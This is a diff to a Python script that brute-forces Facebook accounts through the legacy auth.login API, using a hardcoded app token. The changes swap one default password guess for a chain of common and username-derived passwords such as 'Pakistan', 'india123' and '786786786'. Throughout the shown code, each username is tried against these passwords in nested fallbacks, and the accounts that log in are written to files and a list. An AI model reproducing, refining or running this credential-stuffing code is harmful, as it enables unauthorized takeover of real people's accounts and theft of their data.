@@ -619,7 +619,7 @@ def action():
                                                         cps.close()
                                                         cpb.append(c+user+pass2)
                                                 else:
-                                                        pass3 = 'india123'
+                                                        pass3 = k + c + user
                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                         q = json.load(data)
                                                         if 'access_token' in q:
@@ -636,7 +636,7 @@ def action():
                                                                         cps.close()
                                                                         cpb.append(c+user+pass3)
                                                                 else:
-                                                                        pass4 = 'india1234'
+                                                                        pass4 = k + c
                                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                         q = json.load(data)
                                                                         if 'access_token' in q:
@@ -653,7 +653,7 @@ def action():
                                                                                         cps.close()
                                                                                         cpb.append(c+user+pass4)
                                                                                 else:
-                                                                                        pass4 = 'india1234'
+                                                                                        pass4 = c
                                                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                                         q = json.load(data)
                                                                                         if 'access_token' in q:
@@ -670,7 +670,7 @@ def action():
                                                                                                         cps.close()
                                                                                                         cpb.append(c+user+pass4)
                                                                                                 else:
-                                                                                                        pass4 = 'india1234'
+                                                                                                        pass4 = 'Pakistan'
                                                                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                                                         q = json.load(data)
                                                                                                         if 'access_token' in q:
@@ -687,7 +687,7 @@ def action():
                                                                                                                         cps.close()
                                                                                                                         cpb.append(c+user+pass4)
                                                                                                                  else:
-                                                                                                                        pass4 = 'india1234'
+                                                                                                                        pass4 = 'india123'
                                                                                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                                                                         q = json.load(data)
                                                                                                                         if 'access_token' in q:
@@ -704,7 +704,7 @@ def action():
                                                                                                                                         cps.close()
                                                                                                                                         cpb.append(c+user+pass4)
                                                                                                                                 else:
-                                                                                                                                        pass8 = 'india1234'
+                                                                                                                                        pass8 = '786786786'
                                                                                                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                                                                                         q = json.load(data)
                                                                                                                                         if 'access_token' in q:
